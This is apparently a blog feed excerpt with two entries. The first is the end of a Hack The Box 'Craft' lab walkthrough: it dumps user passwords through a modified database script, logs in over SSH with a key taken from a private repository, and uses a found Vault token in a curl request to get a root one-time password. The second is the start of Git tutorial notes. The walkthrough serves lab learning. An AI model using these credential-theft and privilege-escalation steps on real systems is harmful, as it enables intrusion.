&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;User&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;db.Model&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;id &lt;&#x2F;span&gt;&lt;span&gt;= db.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Column&lt;&#x2F;span&gt;&lt;span&gt;(db.Integer, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;primary_key&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    username = db.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Column&lt;&#x2F;span&gt;&lt;span&gt;(db.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;45&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;    password = db.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Column&lt;&#x2F;span&gt;&lt;span&gt;(db.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;String&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;80&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.username = username
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.password = password
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I had the immediate idea that I should have enumerated the possible hidden databases for possible logins.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The other piece of information that came together while looking into database enumeration was this file called &lt;code&gt;dbtest.py&lt;&#x2F;code&gt;. It&#x27;s a simple file that connects to the database and retrieves 1 result from brew table.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;env python
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;pymysql
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;craft_api &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;settings
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# test connection to mysql database
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;connection = pymysql.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;connect&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;host&lt;&#x2F;span&gt;&lt;span&gt;=settings.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;MYSQL_DATABASE_HOST&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                             &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;=settings.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;MYSQL_DATABASE_USER&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                             &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;=settings.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;MYSQL_DATABASE_PASSWORD&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                             &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;db&lt;&#x2F;span&gt;&lt;span&gt;=settings.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;MYSQL_DATABASE_DB&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                             &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cursorclass&lt;&#x2F;span&gt;&lt;span&gt;=pymysql.cursors.DictCursor)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;: 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span&gt;connection.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cursor&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;cursor:
&lt;&#x2F;span&gt;&lt;span&gt;   
&lt;&#x2F;span&gt;&lt;span&gt;        sql = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SELECT &lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;brewer&lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;abv&lt;&#x2F;span&gt;&lt;span&gt;` &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;FROM &lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;brew&lt;&#x2F;span&gt;&lt;span&gt;` &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;LIMIT &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        cursor.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;execute&lt;&#x2F;span&gt;&lt;span&gt;(sql)
&lt;&#x2F;span&gt;&lt;span&gt;        result = cursor.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fetchone&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(result)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;finally&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    connection.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Let&#x27;s see if we can retrieve data from the &amp;quot;User&amp;quot; table by modifying the code:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;env python
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;pymysql
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;craft_api &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;settings
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# test connection to mysql database
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;connection = pymysql.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;connect&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;host&lt;&#x2F;span&gt;&lt;span&gt;=settings.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;MYSQL_DATABASE_HOST&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                             &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;=settings.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;MYSQL_DATABASE_USER&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                             &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;=settings.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;MYSQL_DATABASE_PASSWORD&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                             &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;db&lt;&#x2F;span&gt;&lt;span&gt;=settings.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;MYSQL_DATABASE_DB&lt;&#x2F;span&gt;&lt;span&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;                             &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cursorclass&lt;&#x2F;span&gt;&lt;span&gt;=pymysql.cursors.DictCursor)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;: 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span&gt;connection.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;cursor&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;cursor:
&lt;&#x2F;span&gt;&lt;span&gt;        sql = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SELECT &lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;` &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;FROM &lt;&#x2F;span&gt;&lt;span&gt;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;`&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        cursor.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;execute&lt;&#x2F;span&gt;&lt;span&gt;(sql)
&lt;&#x2F;span&gt;&lt;span&gt;        result = cursor.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fetchmany&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;size&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(result)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;finally&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    connection.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Take note of the &lt;code&gt;cursor.fetchmany&lt;&#x2F;code&gt;. I got stuck on this as I forgot that it only retrieved one result at a time. Changing this piece of code will select all data from rows 1-10.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-craft&#x2F;htb-craft-dbexploitpy.png&quot; alt=&quot;htb-craft-dbexploitpy.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;And there it is. I got new username and passwords from the SQL database, lets see if we can log into other services with them.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;SSH doesn&#x27;t work. SSH on port 6022 doesn&#x27;t work either. &lt;code&gt;su&lt;&#x2F;code&gt; doesn&#x27;t work either. Logging into Gogs using Gilfoyle&#x27;s credentials worked! There appears to be a private repository.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-craft&#x2F;htb-craft-privaterepo.png&quot; alt=&quot;htb-craft-privaterepo.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The &lt;code&gt;.ssh&lt;&#x2F;code&gt; directory is our ticket in using SSH. Lets download the repository and unzip for the .ssh files.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Login using SSH using the same password as found above:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ssh -i&lt;&#x2F;span&gt;&lt;span&gt; id_rsa gilfoyle@craft.htb
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-craft&#x2F;htb-craft-sshsuccess.png&quot; alt=&quot;htb-craft-sshsuccess.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;Do not ever copy and paste SSH keys, they do not work. The MD5sum doesn&#x27;t match with the original.&lt;&#x2F;code&gt;{:.warning}&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Ran &lt;code&gt;linenum&lt;&#x2F;code&gt; and &lt;code&gt;linuxprivchecker&lt;&#x2F;code&gt; script and I didn&#x27;t find anything out of the ordinary. Nothing in crontab. I started to poke around the home directory and there is a &lt;code&gt;.vault-token&lt;&#x2F;code&gt; file.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-craft&#x2F;htb-craft-vaulttoken.png&quot; alt=&quot;htb-craft-vaulttoken.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A quick Google search shows up as some sort of vault key for HashiCorp.  I see that you can run &lt;code&gt;vault&lt;&#x2F;code&gt; commands so I tried and see what options I had.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-craft&#x2F;htb-craft-vaultcmds.png&quot; alt=&quot;htb-craft-vaultcmds.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Poking around at what it does, I&#x27;m not entirely sure how it works.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;I started to dig around the repository again because the pattern so far with this machine is all clues can be found in the repository. I found this script:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-craft&#x2F;htb-craft-vaultsecrets.png&quot; alt=&quot;htb-craft-vaultsecrets.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A quick Google search reveals that these commands create a SSH session using a one-time password token.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;learn.hashicorp.com&#x2F;vault&#x2F;secrets-management&#x2F;sm-ssh-otp&quot;&gt;SSH Secrets Engine: OTP SSH Password&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Let&#x27;s first run the commands that we found in the script to enable SSH and allow OTP for root.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-craft&#x2F;htb-craft-ssh-otp.png&quot; alt=&quot;htb-craft-ssh-otp.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Next, we need to create a &lt;code&gt;cURL&lt;&#x2F;code&gt; PUT request to get a token generated.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl --header &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --request&lt;&#x2F;span&gt;&lt;span&gt; PUT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --data &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;{&amp;quot;ip&amp;quot;: &amp;quot;127.0.0.1&amp;quot;}&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; https:&#x2F;&#x2F;vault.craft.htb:8200&#x2F;v1&#x2F;ssh&#x2F;creds&#x2F;root_otp
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-craft&#x2F;htb-craft-curl-otp.png&quot; alt=&quot;htb-craft-curl-otp.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Copy the token and &lt;code&gt;ssh&lt;&#x2F;code&gt; using root.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;htb-craft&#x2F;htb-craft-rooted.png&quot; alt=&quot;htb-craft-rooted.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Git Tutorial</title>
        <published>2019-12-27T00:00:00+00:00</published>
        <updated>2019-12-27T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/tutorial-git/" type="text/html"/>
        <id>https://johntuyen.com/posts/tutorial-git/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.lynda.com&#x2F;Git-tutorials&#x2F;Git-Essential-Training&quot;&gt;https:&#x2F;&#x2F;www.lynda.com&#x2F;Git-tutorials&#x2F;Git-Essential-Training&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;0-introduction&quot;&gt;0: Introduction&lt;&#x2F;h3&gt;
&lt;h3 id=&quot;1-what-is-git&quot;&gt;1: What is Git&lt;&#x2F;h3&gt;
&lt;h3 id=&quot;2-installing-git&quot;&gt;2: Installing Git&lt;&#x2F;h3&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git help log
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;3-getting-started&quot;&gt;3: Getting Started&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Most often accessed&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;.git&#x2F;config
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Add every change that&#x27;s been made&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git add .
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Add commit message after adding the changes&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git commit -m
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Tips when writing commit messages:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Add shorthand codes such as &amp;quot;Bugfix:&amp;quot; or &amp;quot;[css,js]&amp;quot; or &amp;quot;#8128 - &amp;quot;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Be clear and descriptive&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show log of previous commits&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git log
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show log number 1&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git log -n 1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Show commit log since specific date&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git log --since=2012-06-14
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git log --unit=2012-05-14
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Search commit messages by name&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git log --author=&amp;quot;jtuyen&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Search commit messages by search term&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;git log --grep=&amp;quot;javascript&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;4-concepts-and-architecture&quot;&gt;4: Concepts and Architecture&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Two-tree (old) vs three-tree structure (git)&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Two-tree: Working - Repository&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Three-tree: Working - Staging Index - Repository&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;When you &lt;code&gt;git add .&lt;&#x2F;code&gt;, it will add all files from the Working to Staging Index. When you &lt;code&gt;git commit&lt;&#x2F;code&gt;, it will push changes to the Repository.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;When you git commit, it will generate a checksum(SHA-1) for each changed set. Data integrity.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;commit 998d834391ae434cbd41e402b61a5c38cd226b43 (HEAD -&amp;gt; master)
&lt;&#x2F;span&gt;&lt;span&gt;Author: jtuyen &amp;lt;john.tuyen@gmail.com&amp;gt;
